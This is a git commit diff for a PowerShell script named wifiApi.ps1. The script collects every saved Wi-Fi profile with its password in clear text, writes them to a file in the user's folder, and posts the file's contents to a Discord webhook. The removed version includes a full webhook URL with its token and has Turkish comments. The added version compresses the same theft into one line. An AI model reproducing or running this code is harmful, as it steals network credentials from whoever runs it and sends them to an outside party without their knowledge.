7fec0734a1632670e16c716cccbd94bd1ee56ae0
berisha9625 <mehmetcakirr44@gmail.com>
2025-07-22 23:43:53 +0300

    Update wifiApi.ps1

--- wifiApi.ps1
+++ wifiApi.ps1
@@ -1,17 +1,1 @@
-# Wi-Fi şifrelerini al ve bir dosyaya kaydet
-netsh wlan show profiles | ForEach-Object {
-    $profile = $_
-    netsh wlan show profile name="$profile" key=clear
-} > "$env:USERPROFILE\wifipass.txt"
-
-# Discord Webhook URL'si
-$w = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'
-
-# Dosya içeriğini oku
-$f = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
-
-# Mesajı JSON formatına dönüştür
-$b = ConvertTo-Json @{content="```$f```"}
-
-# Discord'a gönder
-Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json'
+netsh wlan show profiles | % { netsh wlan show profile name="$_" key=clear } > $env:USERPROFILE\wifipass.txt; $w='https://discord.com/api/webhooks/...'; $f=Get-Content $env:USERPROFILE\wifipass.txt -Raw; $b=ConvertTo-Json @{content="```$f```"}; Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json'
